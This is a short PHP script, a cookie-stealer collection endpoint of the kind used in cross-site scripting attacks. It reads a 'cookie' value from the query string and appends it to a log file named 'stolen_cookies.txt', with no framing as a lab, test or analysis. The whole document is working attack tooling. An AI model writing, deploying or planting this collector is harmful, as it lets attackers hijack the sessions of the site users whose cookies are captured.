<?php
$cookie = $_GET['cookie'];
$logfile = 'stolen_cookies.txt';
file_put_contents($logfile, $cookie . "\n", FILE_APPEND);
?>
